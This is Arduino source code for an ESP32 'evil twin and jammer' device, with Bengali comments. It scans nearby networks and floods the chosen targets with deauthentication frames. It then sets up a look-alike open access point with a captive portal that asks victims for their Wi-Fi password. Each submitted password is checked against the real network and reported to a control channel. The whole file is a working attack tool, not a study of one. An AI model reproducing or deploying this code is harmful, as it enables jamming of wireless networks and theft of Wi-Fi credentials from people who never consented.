/* =========================================================
   ESP32 Evil-Twin + Jammer  —  core 3.x / IDF v5.x FIXED
   Board : ESP32 Dev Module (WROOM-32)
   ========================================================= */
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

#define CTRL_SSID "JAM-CTL"
#define CTRL_PASS "jammer1234"
#define CTRL_PORT 8080
#define MAXT      8
#define MAXSCAN   40
#define AP_MAXCONN 4

struct ScanEnt { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t ch; uint8_t enc; };
ScanEnt scanList[MAXSCAN];
int scanCount = 0;

struct Target { uint8_t bssid[6]; char ssid[33]; uint8_t ch; };
Target tg[MAXT];
volatile int tcount = 0;

volatile bool attacking = false;
volatile bool hold      = false;
volatile int  rotIdx    = 0;
volatile int  assocIdx  = 0;      // ভিক্টিম যে SSID-তে ঢুকেছে
volatile bool rotOn     = false;
uint8_t apCh = 1;

WebServer web(80);
DNSServer dns;
WiFiServer ctl(CTRL_PORT);
WiFiClient ctlClient;

/* ---------- AP কনফিগ অ্যাপ্লাই (AP কখনো বন্ধ হয় না) ---------- */
void apSetSSID(const char *ssid) {
  WiFi.softAP(ssid, NULL, apCh, 0, AP_MAXCONN);   // NULL = open
  WiFi.setSleep(false);
}

void logCtl(const String &s) {
  if (ctlClient && ctlClient.connected()) {
    ctlClient.write((const uint8_t*)s.c_str(), s.length());
    ctlClient.write('\n');
  }
}

/* ---------- deauth ---------- */
void deauthTask(void *) {
  uint8_t f[26] = {0xC0,0x00,0x00,0x00,
                   0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                   0,0,0,0,0,0, 0,0,0,0,0,0, 0,0, 0x07,0x00};
  vTaskDelay(1500 / portTICK_PERIOD_MS);          // AP কে আগে বাঁচতে দাও
  while (true) {
    if (!attacking || hold || tcount == 0) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
    for (int i = 0; i < tcount; i++) {
      memcpy(&f[10], tg[i].bssid, 6);
      memcpy(&f[16], tg[i].bssid, 6);
      for (int k = 0; k < 2; k++) {
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
        ets_delay_us(120);
      }
      vTaskDelay(2 / portTICK_PERIOD_MS);
    }
    vTaskDelay(12 / portTICK_PERIOD_MS);
  }
}

/* ---------- রোটেশন: ক্লায়েন্ট থাকলে থামে ---------- */
void rotateTask(void *) {
  vTaskDelay(2000 / portTICK_PERIOD_MS);
  while (true) {
    if (attacking && rotOn && tcount > 1 && WiFi.softAPgetStationNum() == 0) {
      rotIdx = (rotIdx + 1) % tcount;
      apSetSSID(tg[rotIdx].ssid);
    }
    vTaskDelay(3000 / portTICK_PERIOD_MS);
  }
}

/* ---------- ভেরিফাই ---------- */
bool verifyPW(const char *ssid, const char *pw, uint8_t ch, const uint8_t *bssid) {
  hold = true;
  vTaskDelay(200 / portTICK_PERIOD_MS);
  WiFi.mode(WIFI_AP_STA);                          // AP যেন না মরে
  WiFi.disconnect(false, false);
  vTaskDelay(150 / portTICK_PERIOD_MS);
  WiFi.begin(ssid, pw, ch, bssid);
  bool ok = false;
  uint32_t t0 = millis();
  while (millis() - t0 < 7000) {
    if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
    vTaskDelay(150 / portTICK_PERIOD_MS);
  }
  WiFi.disconnect(false, false);
  vTaskDelay(120 / portTICK_PERIOD_MS);
  WiFi.mode(WIFI_AP_STA);
  WiFi.setSleep(false);
  hold = false;
  return ok;
}

/* ---------- পোর্টাল ---------- */
String page(const String &ssid, const String &body) {
  String h = "<!doctype html><html><head><meta charset='utf-8'>"
             "<meta name='viewport' content='width=device-width,initial-scale=1'>"
             "<title>WiFi</title><style>"
             "body{font-family:system-ui;margin:0;background:#0d1117;color:#e6edf3}"
             ".c{max-width:420px;margin:14vh auto;padding:26px;background:#161b22;"
             "border-radius:14px;border:1px solid #30363d}"
             "h2{margin:0 0 6px;font-size:19px}p{color:#8b949e;font-size:14px}"
             "input{width:100%;padding:12px;margin:12px 0;border-radius:8px;border:1px solid #30363d;"
             "background:#0d1117;color:#e6edf3;font-size:16px;box-sizing:border-box}"
             "button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;"
             "color:#fff;font-size:16px;font-weight:600}"
             "</style></head><body><div class='c'><h2>";
  h += ssid; h += "</h2>"; h += body; h += "</div></body></html>";
  return h;
}

int curIdx() {
  if (tcount == 0) return 0;
  int i = assocIdx;
  if (i < 0 || i >= tcount) i = 0;
  return i;
}

void handleRoot() {
  if (tcount == 0) { web.send(200, "text/html", page("WiFi", "<p>টার্গেট নেই</p>")); return; }
  web.send(200, "text/html", page(tg[curIdx()].ssid,
    "<p>নেটওয়ার্কে ঢুকতে WiFi পাসওয়ার্ড দিন</p>"
    "<form method='POST' action='/submit'>"
    "<input name='pw' type='password' placeholder='পাসওয়ার্ড' autofocus required>"
    "<button>কানেক্ট</button></form>"));
}

void handleSubmit() {
  if (tcount == 0) { web.send(200, "text/html", page("WiFi", "<p>টার্গেট নেই</p>")); return; }
  int idx = curIdx();
  String ssid = String(tg[idx].ssid);
  String pw   = web.arg("pw");

  logCtl("CAP " + String(idx) + " " + ssid + " " + pw);
  bool ok = verifyPW(tg[idx].ssid, pw.c_str(), tg[idx].ch, tg[idx].bssid);
  logCtl("RESULT " + ssid + " " + pw + " " + (ok ? "OK" : "FAIL"));

  apSetSSID(tg[idx].ssid);                         // পোর্টাল সেশন ধরে রাখো

  if (ok) {
    web.send(200, "text/html", page(ssid,
      "<p style='color:#3fb950'>✔ পাসওয়ার্ড সঠিক — কানেক্টেড</p>"));
    vTaskDelay(1500 / portTICK_PERIOD_MS);
    attacking = false;
    esp_wifi_set_promiscuous(false);
  } else {
    web.send(200, "text/html", page(ssid,
      "<p style='color:#f85149'>✘ পাসওয়ার্ড ভুল</p>"
      "<form method='POST' action='/submit'>"
      "<input name='pw' type='password' placeholder='আবার চেষ্টা করুন' autofocus required>"
      "<button>কানেক্ট</button></form>"));
  }
}

/* ---------- স্ক্যান ---------- */
void doScan() {
  bool was = attacking;
  attacking = false; hold = true;
  logCtl("SCAN_BEGIN");
  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, false);
  scanCount = 0;
  for (int i = 0; i < n && scanCount < MAXSCAN; i++) {
    if (WiFi.SSID(i).length() == 0) continue;
    ScanEnt &e = scanList[scanCount];
    strncpy(e.ssid, WiFi.SSID(i).c_str(), 32); e.ssid[32] = 0;
    memcpy(e.bssid, WiFi.BSSID(i), 6);
    e.rssi = WiFi.RSSI(i);
    e.ch   = WiFi.channel(i);
    e.enc  = WiFi.encryptionType(i);
    scanCount++;
    logCtl("AP " + String(scanCount - 1) + " " + String(e.rssi) + " " +
           String(e.ch) + " " + String(e.enc) + " " + String(e.ssid));
  }
  WiFi.scanDelete();
  logCtl("SCAN_END");

  apCh = 1;                                        // স্ক্যান শেষে AP রিস্টোর
  apSetSSID(attacking ? tg[rotIdx].ssid : CTRL_SSID);
  WiFi.setSleep(false);
  hold = false;
  if (was) attacking = true;
}

/* ---------- কমান্ড ---------- */
void handleCmd(String line) {
  line.trim();
  if (line.length() == 0) return;
  if (line == "PING") { logCtl("PONG"); return; }
  if (line == "SCAN") { doScan(); return; }
  if (line == "STOP") {
    attacking = false; hold = false;
    esp_wifi_set_promiscuous(false);
    apCh = 1; apSetSSID(CTRL_SSID);
    logCtl("STOPPED"); return;
  }
  if (line.startsWith("START ")) {
    String rest = line.substring(6);
    tcount = 0;
    int p = 0;
    while (p < (int)rest.length() && tcount < MAXT) {
      int c = rest.indexOf(',', p);
      if (c < 0) c = rest.length();
      int idx = rest.substring(p, c).toInt();
      if (idx >= 0 && idx < scanCount) {
        memcpy(tg[tcount].bssid, scanList[idx].bssid, 6);
        strncpy(tg[tcount].ssid, scanList[idx].ssid, 32);
        tg[tcount].ssid[32] = 0;
        tg[tcount].ch = scanList[idx].ch;
        tcount++;
      }
      p = c + 1;
    }
    if (tcount == 0) { logCtl("ERR no-target"); return; }

    apCh = tg[0].ch;
    for (int i = 1; i < tcount; i++)
      if (tg[i].ch != apCh) logCtl("WARN ch" + String(tg[i].ch) + " different");

    rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
    apSetSSID(tg[0].ssid);

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);

    hold = false; attacking = true;
    logCtl("STARTED " + String(tcount) + " ch" + String(apCh));
    return;
  }
  logCtl("ERR unknown");
}

/* ---------- setup ---------- */
void setup() {
  Serial.begin(115200);
  delay(1200);

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);                 // <-- STA বন্ধ রাখা যাবে না
  delay(300);
  WiFi.setSleep(false);

  apCh = 1;
  bool ok = WiFi.softAP(CTRL_SSID, CTRL_PASS, apCh, 0, AP_MAXCONN);
  delay(600);
  Serial.printf("softAP: %s  IP=%s\n", ok ? "UP" : "FAIL",
                WiFi.softAPIP().toString().c_str());

  dns.start(53, "*", WiFi.softAPIP());
  web.on("/", handleRoot);
  web.on("/submit", HTTP_POST, handleSubmit);
  web.onNotFound(handleRoot);
  web.begin();
  ctl.begin();

  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, 4, NULL, 1);
  xTaskCreatePinnedToCore(rotateTask, "rot",    4096, NULL, 2, NULL, 1);
}

/* ---------- loop ---------- */
String rxBuf;

void loop() {
  dns.processNextRequest();
  web.handleClient();

  if (!ctlClient || !ctlClient.connected()) {
    ctlClient = ctl.available();
    rxBuf = "";
  } else {
    while (ctlClient.available()) {
      char c = ctlClient.read();
      if (c == '\n') { handleCmd(rxBuf); rxBuf = ""; }
      else if (c != '\r' && rxBuf.length() < 200) rxBuf += c;
    }
  }

  // ভিক্টিম কানেক্ট করলে assocIdx ফ্রিজ + সেই SSID-তে AP পিন
  static int lastSta = 0;
  int now = WiFi.softAPgetStationNum();
  if (now > lastSta && attacking && tcount > 0) {
    assocIdx = rotIdx;
    apSetSSID(tg[assocIdx].ssid);
    logCtl("ASSOC " + String(assocIdx) + " " + String(tg[assocIdx].ssid));
  }
  lastSta = now;
}
